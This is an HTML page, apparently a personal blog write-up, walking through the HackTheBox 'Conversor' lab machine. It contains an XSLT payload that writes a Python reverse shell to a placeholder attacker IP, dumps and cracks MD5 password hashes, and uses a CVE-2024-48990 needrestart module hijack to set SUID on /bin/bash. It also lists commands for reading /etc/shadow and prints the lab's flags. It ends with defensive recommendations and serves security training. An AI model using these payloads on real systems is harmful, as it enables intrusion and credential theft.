@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB Conversor Walkthrough</title>
+  <link rel="stylesheet" href="../assets/style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <meta name="description" content="Complete walkthrough of the HackTheBox Conversor machine featuring XXE injection, XSLT exploitation, SQLite database enumeration, and needrestart privilege escalation.">
+  <meta name="keywords" content="conversor, hackthebox, XXE, XSLT, SQLite, needrestart, privilege escalation, CVE-2024-48990">
+  <meta name="author" content="Justin Van Den Hurk">
+</head>
+<body>
+  <div class="container">
+    <header>
+      <a href="../" class="back-link">Back to Writeups</a>
+      
+      <h1>HTB Conversor Walkthrough</h1>
+      <p class="subtitle">XXE Injection & Needrestart Privilege Escalation</p>
+      
+      <div class="challenge-info">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
+          <span class="text-muted">Published: October 2, 2025</span>
+          <span class="text-muted">Difficulty: Medium</span>
+        </div>
+        <p>Conversor is a HackTheBox machine that demonstrates XXE (XML External Entity) injection vulnerabilities combined with XSLT exploitation for initial access, followed by exploiting CVE-2024-48990 in needrestart for privilege escalation. This machine teaches web application security and modern Linux privilege escalation techniques.</p>
+      </div>
+    </header>
+
+    <nav id="pre-security-nav">
+      <ul class="section-nav">
+        <li><a href="#reconnaissance">Reconnaissance</a></li>
+        <li><a href="#xxe-exploitation">XXE Exploitation</a></li>
+        <li><a href="#database-enumeration">Database Enumeration</a></li>
+        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+      </ul>
+    </nav>
+
+    <main>
+      <article>
+        <section id="reconnaissance">
+          <h2>Reconnaissance Phase</h2>
+          
+          <div class="level-solution">
+            <h3>Network Scanning</h3>
+            <p><strong>Objective:</strong> Discover open ports and running services on the target machine.</p>
+            
+            <p>Perform a service version scan using Nmap:</p>
+            <pre><code>nmap -sV &lt;TARGET_IP&gt;</code></pre>
+            
+            <p>The scan reveals the following open ports:</p>
+            <ul>
+              <li><strong>Port 22 (SSH):</strong> OpenSSH 8.9p1 Ubuntu 3ubuntu0.13</li>
+              <li><strong>Port 80 (HTTP):</strong> Apache httpd 2.4.52</li>
+            </ul>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Limited attack surface with SSH and HTTP services. The web application becomes the primary target for initial access.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Web Application Access</h3>
+            <p><strong>Objective:</strong> Access and analyze the web application.</p>
+            
+            <p>Attempting to access the target IP directly in the browser results in a connection error. This indicates the application requires a specific domain name.</p>
+            
+            <p><strong>HOSTS File Configuration:</strong></p>
+            <p>Add the target IP to your hosts file to map it to the domain name:</p>
+            <pre><code># On Linux/Mac
+sudo nano /etc/hosts
+
+# Add the following line
+&lt;TARGET_IP&gt;    conversor.htb
+
+# On Windows
+# Edit C:\Windows\System32\drivers\etc\hosts
+&lt;TARGET_IP&gt;    conversor.htb</code></pre>
+            
+            <p>After configuring the hosts file, navigate to <code>http://conversor.htb</code> in your browser.</p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Virtual hosting requires proper domain name configuration. HOSTS file manipulation allows local DNS resolution for penetration testing.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Account Registration</h3>
+            <p><strong>Objective:</strong> Create an account to access application features.</p>
+            
+            <p>Register an account on the web application:</p>
+            <ul>
+              <li><strong>Username:</strong> anon</li>
+              <li><strong>Password:</strong> (your chosen password)</li>
+            </ul>
+            
+            <p>After registration, explore the application's functionality to identify potential vulnerabilities. Look for:</p>
+            <ul>
+              <li>File upload features</li>
+              <li>Data conversion or processing functions</li>
+              <li>XML/JSON parsing endpoints</li>
+              <li>API documentation</li>
+            </ul>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Application functionality often reveals attack vectors. File processing features are particularly interesting for XXE and injection attacks.</p>
+          </div>
+        </section>
+
+        <section id="xxe-exploitation">
+          <h2>XXE & XSLT Exploitation</h2>
+          
+          <div class="level-solution">
+            <h3>Understanding the Vulnerability</h3>
+            <p><strong>Objective:</strong> Identify and exploit XXE (XML External Entity) vulnerabilities.</p>
+            
+            <p>The application appears to process XML files, potentially through an XSLT transformation. This creates an opportunity for XXE injection combined with XSLT exploitation.</p>
+            
+            <p><strong>XXE Attack Overview:</strong></p>
+            <ul>
+              <li>XML parsers that process external entities can be exploited</li>
+              <li>XSLT transformations can execute arbitrary code</li>
+              <li>We can write files to the server using XSLT document() function</li>
+            </ul>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>XXE vulnerabilities allow attackers to read files, perform SSRF attacks, and in some cases achieve code execution through XSLT exploitation.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Crafting the Exploit Payload</h3>
+            <p><strong>Objective:</strong> Create malicious XML and XSLT files to achieve code execution.</p>
+            
+            <p><strong>Step 1: Create the XML File (nmap.xml)</strong></p>
+            <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;nmaprun&gt;
+  &lt;host&gt;
+    &lt;address addr="127.0.0.1"/&gt;
+  &lt;/host&gt;
+&lt;/nmaprun&gt;</code></pre>
+            
+            <p><strong>Step 2: Create the XSLT Exploit (exploit.xslt)</strong></p>
+            <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
+                xmlns:exploit="http://exslt.org/common" 
+                extension-element-prefixes="exploit" 
+                version="1.0"&gt;
+  &lt;xsl:template match="/"&gt;
+    &lt;exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text"&gt;
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("YOUR_HTB_VPN_IP",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("/bin/sh")
+    &lt;/exploit:document&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</code></pre>
+            
+            <p><strong>Important:</strong> Replace <code>YOUR_HTB_VPN_IP</code> with your actual VPN IP address.</p>
+            
+            <p><strong>Payload Explanation:</strong></p>
+            <ul>
+              <li>XSLT <code>document()</code> function writes content to a file</li>
+              <li>Target path: <code>/var/www/conversor.htb/scripts/shell.py</code></li>
+              <li>Payload: Python reverse shell connecting to our listener</li>
+            </ul>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>XSLT document() function can be abused to write arbitrary files on the server. This combined with web-accessible directories leads to remote code execution.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Establishing Reverse Shell</h3>
+            <p><strong>Objective:</strong> Execute the uploaded Python reverse shell to gain initial access.</p>
+            
+            <p><strong>Step 1: Set Up Listener</strong></p>
+            <pre><code>nc -lvnp 4444</code></pre>
+            
+            <p><strong>Step 2: Upload Exploit Files</strong></p>
+            <p>Upload both <code>nmap.xml</code> and <code>exploit.xslt</code> through the application's file processing feature.</p>
+            
+            <p><strong>Step 3: Trigger Execution</strong></p>
+            <p>Navigate to the uploaded shell script (exact method depends on application functionality):</p>
+            <pre><code>curl http://conversor.htb/scripts/shell.py</code></pre>
+            
+            <p>Or trigger through the web interface by accessing the scripts directory.</p>
+            
+            <p>Check your Netcat listener for the incoming shell connection.</p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>XSLT exploitation provides a powerful method for achieving remote code execution through seemingly harmless XML processing features.</p>
+          </div>
+        </section>
+
+        <section id="database-enumeration">
+          <h2>System and Database Enumeration</h2>
+          
+          <div class="level-solution">
+            <h3>Initial System Exploration</h3>
+            <p><strong>Objective:</strong> Explore the system and locate sensitive files.</p>
+            
+            <p>List files in the current directory:</p>
+            <pre><code>ls</code></pre>
+            
+            <p>Result shows <code>conversor.htb</code> directory. Navigate into it:</p>
+            <pre><code>cd conversor.htb
+ls</code></pre>
+            
+            <p>Files discovered:</p>
+            <ul>
+              <li><code>app.py</code> - Main application file</li>
+              <li><code>app.wsgi</code> - WSGI configuration</li>
+              <li><code>instance/</code> - Instance folder (often contains databases)</li>
+              <li><code>__pycache__/</code> - Python cache</li>
+              <li><code>scripts/</code> - Scripts directory</li>
+              <li><code>static/</code> - Static files</li>
+              <li><code>templates/</code> - HTML templates</li>
+              <li><code>uploads/</code> - Upload directory</li>
+            </ul>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Flask applications typically store SQLite databases in the instance folder. Always check application structure for sensitive data.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>SQLite Database Extraction</h3>
+            <p><strong>Objective:</strong> Extract and analyze the SQLite database containing user credentials.</p>
+            
+            <p>Navigate to the instance directory:</p>
+            <pre><code>cd instance
+ls</code></pre>
+            
+            <p>Found: <code>users.db</code></p>
+            
+            <p><strong>Query the Database:</strong></p>
+            <pre><code>sqlite3 -header -column users.db "SELECT * FROM users;"</code></pre>
+            
+            <p>Results:</p>
+            <pre><code>id  username        password                        
+--  --------------  --------------------------------
+1   fismathack      5b5c3ac3a1c897c94caad48e6c71fdec
+5   test            cc03e747a6afbbcbf8be7668acfebee5
+6   wetpoochie      25f7b348f63e2f4d099383ffb184b220
+7   s3r4ph          75bb0a1e0ccd2aa1017c99dc44d68ed7
+8   root            63a9f0ea7bb98050796b649e85481845
+9   ss              3691308f2a4c2f6983f2880d32e29c84
+10  htbuser         47b7bfb65fa83ac9a71dcb0f6296bb6e
+11  blumoon         e10adc3949ba59abbe56e057f20f883e
+12  admin           21232f297a57a5a743894a0e4a801fc3
+13  adim            098f6bcd4621d373cade4e832627b4f6
+14  admin@rock.com  0cbc6611f5540bd0809a388dc95a615b
+15  test@test.com   68a24878cc568766b735c62be5f306ed
+16  test12345       c06db68e819be6ec3d26c6038d8e8d1f</code></pre>
+            
+            <p><strong>Alternative SQLite Commands:</strong></p>
+            <pre><code># List all tables
+sqlite3 users.db ".tables"
+
+# Show schema
+sqlite3 users.db ".schema users"
+
+# Dump entire database
+sqlite3 users.db ".dump"</code></pre>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>SQLite databases often contain plaintext or weakly hashed credentials. MD5 hashes without salt are particularly vulnerable to rainbow table attacks.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Hash Cracking</h3>
+            <p><strong>Objective:</strong> Crack the MD5 password hashes to obtain plaintext credentials.</p>
+            
+            <p>Use <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">CrackStation</a> to crack the MD5 hash:</p>
+            
+            <p><strong>Target Hash:</strong></p>
+            <pre><code>fismathack: 5b5c3ac3a1c897c94caad48e6c71fdec</code></pre>
+            
+            <p><strong>Cracked Password:</strong></p>
+            <div class="flag-container">
+              <strong>Password: Keepmesafeandwarm</strong>
+            </div>
+            
+            <p><strong>Alternative Cracking Methods:</strong></p>
+            <pre><code># Using hashcat
+hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Using john the ripper
+john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Online rainbow tables
+# - CrackStation.net
+# - HashKiller.io
+# - OnlineHashCrack.com</code></pre>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>MD5 is cryptographically broken and should never be used for password hashing. Modern password hashing should use bcrypt, scrypt, or Argon2.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>User Access and Flag Retrieval</h3>
+            <p><strong>Objective:</strong> Switch to the compromised user account and retrieve the user flag.</p>
+            
+            <p>Switch to the fismathack user:</p>
+            <pre><code>su fismathack</code></pre>
+            
+            <p>Enter password: <code>Keepmesafeandwarm</code></p>
+            
+            <p>Navigate to the user's home directory:</p>
+            <pre><code>cd /home/fismathack
+ls -la</code></pre>
+            
+            <p>Read the user flag:</p>
+            <pre><code>cat user.txt</code></pre>
+            
+            <div class="flag-container">
+              <strong>🚩 User Flag: 6eb77af62761b30a458c69fb298613fb</strong>
+            </div>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Lateral movement through compromised credentials is a critical step in system compromise. Always check home directories for sensitive files and flags.</p>
+          </div>
+        </section>
+
+        <section id="privilege-escalation">
+          <h2>Privilege Escalation to Root</h2>
+          
+          <div class="level-solution">
+            <h3>Sudo Privileges Enumeration</h3>
+            <p><strong>Objective:</strong> Identify sudo privileges that can be exploited for privilege escalation.</p>
+            
+            <p>Check sudo permissions:</p>
+            <pre><code>sudo -l</code></pre>
+            
+            <p>Output:</p>
+            <pre><code>Matching Defaults entries for fismathack on conversor:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User fismathack may run the following commands on conversor:
+    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart</code></pre>
+            
+            <p>The user can run <code>needrestart</code> with sudo privileges without a password.</p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Always check sudo privileges immediately after gaining user access. NOPASSWD entries provide direct paths to privilege escalation.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>CVE-2024-48990: Needrestart Vulnerability</h3>
+            <p><strong>Objective:</strong> Exploit the needrestart vulnerability to achieve root access.</p>
+            
+            <p><strong>Vulnerability Details:</strong></p>
+            <p>CVE-2024-48990 is a local privilege escalation vulnerability in needrestart. The vulnerability allows attackers to manipulate Python module imports to execute arbitrary code as root.</p>
+            
+            <p><strong>Reference:</strong></p>
+            <ul>
+              <li><a href="https://ubuntu.com/blog/needrestart-local-privilege-escalation" target="_blank" rel="noopener noreferrer">Ubuntu Security Advisory</a></li>
+              <li>CVE: CVE-2024-48990</li>
+              <li>Impact: Local Privilege Escalation</li>
+              <li>Affected Versions: needrestart &lt; 3.8</li>
+            </ul>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Needrestart is a utility that checks which services need restarting after library updates. The vulnerability exists in how it scans and imports Python modules.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Exploitation Process</h3>
+            <p><strong>Objective:</strong> Execute the exploit to gain root privileges.</p>
+            
+            <p><strong>Step 1: Create Malicious Python Module</strong></p>
+            <pre><code>cd /tmp
+mkdir -p attacker/importlib</code></pre>
+            
+            <p><strong>Step 2: Create Exploit Code</strong></p>
+            <pre><code>cat &gt; attacker/importlib/__init__.py &lt;&lt; 'EOF'
+import os
+os.system('chmod u+s /bin/bash')
+EOF</code></pre>
+            
+            <p><strong>Exploit Explanation:</strong></p>
+            <ul>
+              <li>Creates a malicious Python module in <code>/tmp/attacker/importlib/</code></li>
+              <li>When needrestart scans for modules, it will import our malicious code</li>
+              <li>The code sets SUID bit on <code>/bin/bash</code>, allowing privilege escalation</li>
+            </ul>
+            
+            <p><strong>Step 3: Trigger the Vulnerability</strong></p>
+            <pre><code>sudo needrestart -r a</code></pre>
+            
+            <p>The <code>-r a</code> flag forces needrestart to automatically restart services, triggering the module scan.</p>
+            
+            <p><strong>Step 4: Escalate to Root</strong></p>
+            <pre><code>/bin/bash -p</code></pre>
+            
+            <p>The <code>-p</code> flag preserves the SUID privileges, giving you a root shell.</p>
+            
+            <p><strong>Verify Root Access:</strong></p>
+            <pre><code>whoami</code></pre>
+            
+            <p>Output should be: <code>root</code></p>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Python module hijacking exploits trust in the module import system. SUID binaries provide direct privilege escalation when properly manipulated.</p>
+          </div>
+
+          <div class="level-solution">
+            <h3>Root Flag Retrieval</h3>
+            <p><strong>Objective:</strong> Retrieve the final root flag.</p>
+            
+            <p>Navigate to root directory and read the flag:</p>
+            <pre><code>cat /root/root.txt</code></pre>
+            
+            <div class="flag-container">
+              <strong>🚩 Root Flag: a3720670f454e7bb272ada000ce261a3</strong>
+            </div>
+            
+            <p><strong>Post-Exploitation Activities:</strong></p>
+            <pre><code># View root directory contents
+ls -la /root/
+
+# Check command history
+cat /root/.bash_history
+
+# View shadow file
+cat /etc/shadow
+
+# Check cron jobs
+crontab -l
+ls -la /etc/cron*</code></pre>
+            
+            <p><strong>Key Learnings:</strong></p>
+            <p>Root access provides complete system control. In real penetration tests, this is where you would establish persistence, document findings, and prepare the final report.</p>
+          </div>
+        </section>
+
+        <section id="summary">
+          <h2>Challenge Summary</h2>
+          
+          <div class="level-solution">
+            <h3>Complete Attack Chain</h3>
+            <p><strong>Full Exploitation Path:</strong></p>
+            
+            <ol>
+              <li><strong>Reconnaissance:</strong> Discovered HTTP and SSH services</li>
+              <li><strong>Access Establishment:</strong> Configured hosts file and registered account</li>
+              <li><strong>XXE/XSLT Exploitation:</strong> Uploaded malicious XML/XSLT files to write reverse shell</li>
+              <li><strong>Initial Access:</strong> Triggered Python reverse shell for initial foothold</li>
+              <li><strong>Database Enumeration:</strong> Found SQLite database with user credentials</li>
+              <li><strong>Credential Cracking:</strong> Cracked MD5 hashes to obtain plaintext passwords</li>
+              <li><strong>Lateral Movement:</strong> Switched to fismathack user account</li>
+              <li><strong>Privilege Escalation:</strong> Exploited CVE-2024-48990 in needrestart</li>
+              <li><strong>Root Access:</strong> Achieved full system compromise</li>
+            </ol>
+            
+            <p><strong>Flags Captured:</strong></p>
+            <div class="flag-container">
+              <strong>🚩 User Flag: 6eb77af62761b30a458c69fb298613fb</strong><br>
+              <strong>🚩 Root Flag: a3720670f454e7bb272ada000ce261a3</strong>
+            </div>
+            
+            <p><strong>Technical Skills Demonstrated:</strong></p>
+            <ul>
+              <li>Network reconnaissance and service enumeration</li>
+              <li>Virtual host configuration and DNS manipulation</li>
+              <li>XXE (XML External Entity) injection</li>
+              <li>XSLT exploitation for code execution</li>
+              <li>Reverse shell deployment and connection</li>
+              <li>SQLite database enumeration and extraction</li>
+              <li>MD5 hash cracking techniques</li>
+              <li>Linux privilege enumeration</li>
+              <li>CVE research and exploitation</li>
+              <li>Python module hijacking</li>
+              <li>SUID binary manipulation</li>
+            </ul>
+            
+            <p><strong>Vulnerabilities Identified:</strong></p>
+            <ul>
+              <li><strong>XXE Injection:</strong> XML parser processes external entities unsafely</li>
+              <li><strong>XSLT Code Execution:</strong> XSLT transformations allow arbitrary file writes</li>
+              <li><strong>Weak Password Hashing:</strong> MD5 without salt enables easy cracking</li>
+              <li><strong>Database Exposure:</strong> SQLite database accessible to web server user</li>
+              <li><strong>Excessive Sudo Privileges:</strong> NOPASSWD sudo access to vulnerable binary</li>
+              <li><strong>CVE-2024-48990:</strong> Needrestart local privilege escalation</li>
+            </ul>
+            
+            <p><strong>Defensive Recommendations:</strong></p>
+            <ul>
+              <li><strong>XML Processing:</strong> Disable external entity processing in XML parsers</li>
+              <li><strong>XSLT Security:</strong> Restrict XSLT transformation capabilities</li>
+              <li><strong>Password Hashing:</strong> Use bcrypt, scrypt, or Argon2 instead of MD5</li>
+              <li><strong>Database Security:</strong> Implement proper file permissions and encryption</li>
+              <li><strong>Sudo Hardening:</strong> Minimize sudo access and avoid NOPASSWD entries</li>
+              <li><strong>Patch Management:</strong> Keep systems updated to address known CVEs</li>
+              <li><strong>Input Validation:</strong> Validate and sanitize all user inputs</li>
+              <li><strong>Least Privilege:</strong> Run services with minimal required permissions</li>
+            </ul>
+            
+            <p><strong>Tools and Techniques Used:</strong></p>
+            <ul>
+              <li><strong>Nmap:</strong> Network scanning and service detection</li>
+              <li><strong>Netcat:</strong> Reverse shell listener</li>
+              <li><strong>XXE/XSLT Payloads:</strong> Custom XML exploitation</li>
+              <li><strong>SQLite:</strong> Database enumeration and extraction</li>
+              <li><strong>CrackStation:</strong> MD5 hash cracking</li>
+              <li><strong>Python:</strong> Reverse shell and exploit development</li>
+              <li><strong>CVE Exploitation:</strong> Needrestart privilege escalation</li>
+            </ul>
+            
+            <p><strong>Real-World Implications:</strong></p>
+            <ul>
+              <li>XXE vulnerabilities remain common in web applications processing XML</li>
+              <li>Weak password hashing practices continue to expose user credentials</li>
+              <li>System utilities with sudo privileges can become privilege escalation vectors</li>
+              <li>Timely patching is critical for preventing exploitation of published CVEs</li>
+              <li>Defense in depth prevents single vulnerabilities from leading to full compromise</li>
+            </ul>
+          </div>
+        </section>
+      </article>
+      
+    </main>
+
+    <footer>
+      <p>
+        Created by <a href="https://www.linkedin.com/in/justin-tom-van-den-hurk/" target="_blank" rel="noopener noreferrer">Justin Van Den Hurk</a>
+        • 
+        <a href="https://github.com/jvandenhurk" target="_blank" rel="noopener noreferrer">View on GitHub</a>
+      </p>
+      <p class="text-muted">Last updated: October 2025</p>
+      <a class="backtotop" href="#">Back to top</a>
+    </footer>
+  </div>
+</body>
+</html>
